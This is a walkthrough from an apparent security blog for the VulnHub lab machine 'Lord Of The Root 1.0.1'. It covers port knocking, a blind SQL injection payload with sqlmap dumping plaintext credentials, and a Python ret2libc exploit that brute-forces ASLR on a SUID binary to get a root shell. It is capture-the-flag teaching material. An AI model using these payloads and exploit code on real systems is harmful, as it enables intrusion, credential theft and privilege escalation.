@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Lord Of The Root 1.0.1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Lord Of The Root 1.0.1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: This is a boot-to-root machine will not require any guest interaction." />
+<meta property="og:description" content="Description: This is a boot-to-root machine will not require any guest interaction." />
+<link rel="canonical" href="http://localhost:4000/lordoftheroot.html" />
+<meta property="og:url" content="http://localhost:4000/lordoftheroot.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/lordoftheroot.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-11-03T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/lordoftheroot.html" />
+<meta property="twitter:title" content="VulnHub - Lord Of The Root 1.0.1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Lord Of The Root 1.0.1","dateModified":"2021-11-03T00:00:00-05:00","datePublished":"2021-11-03T00:00:00-05:00","url":"http://localhost:4000/lordoftheroot.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/lordoftheroot.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: This is a boot-to-root machine will not require any guest interaction.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Lord Of The Root 1.0.1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>November 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> This is a boot-to-root machine will not require any guest interaction.</p>
+
+<p><strong>Author:</strong> KookSec</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> Gain access to the server and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>On the local network the target machine was discovered using an ARP scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-I</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts  
+                                                                 
+ 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.161 00:0c:29:05:a0:43      1      42  VMware, Inc.  
+ 192.168.179.254 00:50:56:ea:b7:4a      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>I performed a full UDP/TCP scan with unicornscan, the only TCP service available is SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+adding 192.168.179.161/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `1-65535'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+TCP open 192.168.179.161:22  ttl 64
+sender statistics 2923.0 pps with 196605 packets sent total
+listener statistics 6 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.179.161  ttl 64 
+adding 192.168.179.161/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `1-65535'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+UDP open 192.168.179.161:57025  ttl 64
+sender statistics 2883.0 pps with 196632 packets sent total
+listener statistics 4 packets recieved 0 packets droped and 0 interface drops
+UDP open                 unknown[57025]         from 192.168.179.161  ttl 64
+</code></pre></div></div>
+
+<h3 id="ssh-enumeration">SSH Enumeration</h3>
+
+<p>I connected to SSH and could see on the banner a number sequence from 1 to 3 to perform port knocking.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh 192.168.179.161
+The authenticity of host <span class="s1">'192.168.179.161 (192.168.179.161)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>192.168.179.161<span class="s1">' (ECDSA) to the list of known hosts.
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+root@192.168.179.161'</span>s password: 
+</code></pre></div></div>
+
+<p>With a oneliner bash script I connected to ports 1,2,3 sequentially.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="k">for </span>x <span class="k">in </span>1 2 3<span class="p">;</span> <span class="k">do </span>nc <span class="nt">-w</span> 1 192.168.179.161 <span class="nv">$x</span><span class="p">;</span> <span class="k">done</span>
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.161] 1 <span class="o">(</span>tcpmux<span class="o">)</span> : Connection timed out
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.161] 2 <span class="o">(</span>?<span class="o">)</span> : Connection timed out
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.161] 3 <span class="o">(</span>?<span class="o">)</span> : Connection timed out
+</code></pre></div></div>
+
+<p>The target machine was rescanned to detect possible open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+adding 192.168.179.161/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `1-65535'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+TCP open 192.168.179.161:1337  ttl 64
+TCP open 192.168.179.161:22  ttl 64
+sender statistics 2826.7 pps with 196605 packets sent total
+listener statistics 12 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.179.161  ttl 64 
+TCP open          menandmice-dns[ 1337]         from 192.168.179.161  ttl 64
+</code></pre></div></div>
+
+<p>With nmap service detection and script scanning was performed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,1337 192.168.179.161 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 <span class="o">(</span>ED25519<span class="o">)</span>
+1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>The web service running on port 1337 doesn’t contain anything, to more than one image.</p>
+
+<p><img src="/assets/images/lordoftheroot/screenshot-1.png" alt="" /></p>
+
+<p>Checking the robots.txt file, a base64 string is commented in the page source.</p>
+
+<p><img src="/assets/images/lordoftheroot/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/lordoftheroot/screenshot-3.png" alt="" /></p>
+
+<p>I decoded the base64 string 2 times and got a new web path.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.161:1337/robots.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'TH[^&gt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null 
+/978345210/index.php
+</code></pre></div></div>
+
+<p>I accessed it, and it redirected me to a login page.</p>
+
+<p><img src="/assets/images/lordoftheroot/screenshot-4.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+
+<p>To further test the login form I used sqlmap, this detected a SQL Injection vulnerability in the username parameter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5
+...
+POST parameter <span class="s1">'username'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 4856 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+<span class="nt">---</span>
+Parameter: username <span class="o">(</span>POST<span class="o">)</span>
+    Type: time-based blind
+    Title: MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
+    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s1">' AND (SELECT 8370 FROM (SELECT(SLEEP(5)))txxC)-- bzWz&amp;password=password&amp;submit= Login
+---
+[21:42:20] [INFO] the back-end DBMS is MySQL
+...
+</span></code></pre></div></div>
+
+<p>Listing the available databases.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span>
+...
+available databases <span class="o">[</span>4]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Webapp
+</code></pre></div></div>
+
+<p>Retrieving the users table from the Webapp database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> Webapp <span class="nt">--tables</span>
+...
+Users
+Database: Webapp
+<span class="o">[</span>1 table]
++-------+
+| Users |
++-------+
+</code></pre></div></div>
+
+<p>Listing the columns from the table users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> Webapp <span class="nt">-T</span> Users <span class="nt">--columns</span>
+...
+Database: Webapp
+Table: Users
+<span class="o">[</span>3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| <span class="nb">id</span>       | int<span class="o">(</span>10<span class="o">)</span>      |
+| password | varchar<span class="o">(</span>255<span class="o">)</span> |
+| username | varchar<span class="o">(</span>255<span class="o">)</span> |
++----------+--------------+
+</code></pre></div></div>
+
+<p>Retrieving the user credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> Webapp <span class="nt">-T</span> Users <span class="nt">-C</span> <span class="nb">id</span>,username,password <span class="nt">--dump</span>
+...
+Database: Webapp
+Table: Users
+<span class="o">[</span>5 entries]
++----+----------+------------------+
+| <span class="nb">id</span> | username | password         |
++----+----------+------------------+
+| 1  | frodo    | iwilltakethering |
+| 2  | smeagol  | MyPreciousR00t   |
+| 3  | aragorn  | AndMySword       |
+| 4  | legolas  | AndMyBow         |
+| 5  | gimli    | AndMyAxe         |
++----+----------+------------------+
+</code></pre></div></div>
+
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>The credentials are in plain text, so we don’t need to crack them, with the user smeagol, I was able to access via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@192.168.179.161<span class="s1">'s password: 
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+                            .____    _____________________________                              
+                            |    |   \_____  \__    ___/\______   \                             
+                            |    |    /   |   \|    |    |       _/                             
+                            |    |___/    |    \    |    |    |   \                             
+                            |_______ \_______  /____|    |____|_  /                             
+                                    \/       \/                 \/                              
+ __      __       .__                                ___________      .__                   .___
+/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
+\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
+ \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
+  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | 
+       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
+Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
+smeagol@LordOfTheRoot:~$ id
+uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
+</span></code></pre></div></div>
+
+<p>Listing the SUID binary files, three of them catch my attention.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null 
+...
+/SECRET/door2/file
+/SECRET/door1/file
+/SECRET/door3/file
+...
+</code></pre></div></div>
+
+<h3 id="suid-binary">SUID Binary</h3>
+
+<p>So I tried to cause a crash passing it 500 characters as parameter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="o">{</span>1..3<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$x</span><span class="p">;</span> /SECRET/door<span class="nv">$x</span>/file <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*500)'</span><span class="si">)</span><span class="p">;</span> <span class="k">done
+</span>1
+2
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+3
+</code></pre></div></div>
+
+<p>The crash was triggered on the file of the door2, since this vulnerable binary randomly switches doors in a certain period of time, I decided to make a copy of this to another directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /SECRET/door<span class="k">*</span> | <span class="nb">grep </span>file
+<span class="nt">-rwsr-xr-x</span> 1 root root 7370 Sep 17  2015 file
+<span class="nt">-rwsr-xr-x</span> 1 root root 5150 Sep 22  2015 file
+<span class="nt">-rwsr-xr-x</span> 1 root root 7370 Sep 17  2015 file
+
+smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">cp</span> /SECRET/door2/file <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Before to start debugging, I was able to detect that the ASLR protection is enabled, since we can see that only two values of the memory address are changing, we can brute force to bypass this.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
+2
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>ldd file | <span class="nb">grep</span> <span class="s1">'libc'</span>
+        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7546000<span class="o">)</span>
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>ldd file | <span class="nb">grep</span> <span class="s1">'libc'</span>
+        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7521000<span class="o">)</span>
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>ldd file | <span class="nb">grep</span> <span class="s1">'libc'</span>
+        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb752e000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Exists a technique named ret2lib, this does not require of a shellcode to exploit it, we need to find the memory address of <strong>system, exit and shell</strong>, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>readelf <span class="nt">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s1">'system'</span>
+  1443: 00040190    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+  
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>readelf <span class="nt">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s1">'exit'</span>
+   139: 000331e0    45 FUNC    GLOBAL DEFAULT   12 <span class="nb">exit</span>@@GLIBC_2.0
+  
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>strings <span class="nt">-atx</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="s1">'/bin/sh'</span>
+ 160a24 /bin/sh
+</code></pre></div></div>
+
+<p>The following python script helped me to brute force and exploit the vulnerable binary automatically, an interesting article that talks about this topic you can find it <a href="https://akshit-singhal.medium.com/how-to-bypass-aslr-to-perform-buffer-overflow-attacks-2d5f6707399c">here</a>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+<span class="kn">import</span> <span class="nn">struct</span><span class="p">,</span><span class="n">os</span>
+
+<span class="n">libc_address</span><span class="o">=</span><span class="mh">0xb7578000</span>
+
+<span class="n">system</span><span class="o">=</span><span class="mh">0x00040190</span>
+<span class="nb">exit</span><span class="o">=</span><span class="mh">0x000331e0</span>
+<span class="n">shell</span><span class="o">=</span><span class="mh">0x00160a24</span>
+
+<span class="n">system_addr</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">system</span><span class="p">)</span>
+<span class="n">exit_addr</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="nb">exit</span><span class="p">)</span>
+<span class="n">shell_addr</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>
+
+<span class="n">buf</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">171</span>
+<span class="n">buf</span><span class="o">+=</span><span class="n">system_addr</span>
+<span class="n">buf</span><span class="o">+=</span><span class="n">exit_addr</span>
+<span class="n">buf</span><span class="o">+=</span><span class="n">shell_addr</span>
+
+<span class="n">i</span><span class="p">,</span><span class="n">n</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span>
+
+<span class="k">while</span><span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">):</span>
+    <span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">getsize</span><span class="p">(</span><span class="s">"/SECRET/door{}/file"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">5150</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Door {} Open"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">" Attempt {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+            <span class="n">path</span><span class="o">=</span><span class="s">"/SECRET/door{}/file"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+            <span class="n">ret</span><span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="n">path</span><span class="p">,</span> <span class="n">buf</span><span class="p">])</span>
+            <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
+    <span class="n">n</span><span class="o">+=</span><span class="mi">1</span>
+    <span class="n">i</span><span class="o">=</span><span class="mi">1</span>
+
+    <span class="k">if</span> <span class="n">n</span><span class="o">==</span><span class="mi">4</span><span class="p">:</span>
+        <span class="n">n</span><span class="o">=</span><span class="mi">1</span>
+</code></pre></div></div>
+
+<p>As we see, with few attempts was possible to exploit the binary and get a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>python exp.py
+<span class="o">[</span>-] Door 1 Open   
+ ...
+ Attempt 70
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
+<span class="c"># python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'</span>
+root@LordOfTheRoot:/dev/shm# <span class="nb">cd</span> /root/
+root@LordOfTheRoot:/root# <span class="nb">ls
+</span>buf  buf.c  Flag.txt  other  other.c  switcher.py
+</code></pre></div></div>
+
+<p>In the root directory the switcher.py script randomly copy the buf file through a cron job that runs every three minutes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# <span class="nb">cat </span>switcher.py 
+<span class="c">#!/usr/bin/python</span>
+import os
+from random import randint
+
+<span class="nv">targets</span><span class="o">=</span> <span class="o">[</span><span class="s2">"/SECRET/door1/"</span>,<span class="s2">"/SECRET/door2/"</span>,<span class="s2">"/SECRET/door3/"</span><span class="o">]</span>
+<span class="k">for </span>t <span class="k">in </span>targets:
+   os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"*"</span><span class="o">)</span>
+   os.system<span class="o">(</span><span class="s2">"cp -p other "</span>+t<span class="o">)</span>
+   os.system<span class="o">(</span><span class="s2">"cp -p "</span>+t+<span class="s2">"other "</span>+t+<span class="s2">"file"</span><span class="o">)</span>
+   os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"other"</span><span class="o">)</span>
+
+luckyDoor <span class="o">=</span> randint<span class="o">(</span>0,2<span class="o">)</span>
+<span class="nv">t</span><span class="o">=</span>targets[luckyDoor]
+os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"*"</span><span class="o">)</span>
+os.system<span class="o">(</span><span class="s2">"cp -p buf "</span>+t<span class="o">)</span>
+os.system<span class="o">(</span><span class="s2">"cp -p "</span>+t+<span class="s2">"buf "</span>+t+<span class="s2">"file"</span><span class="o">)</span>
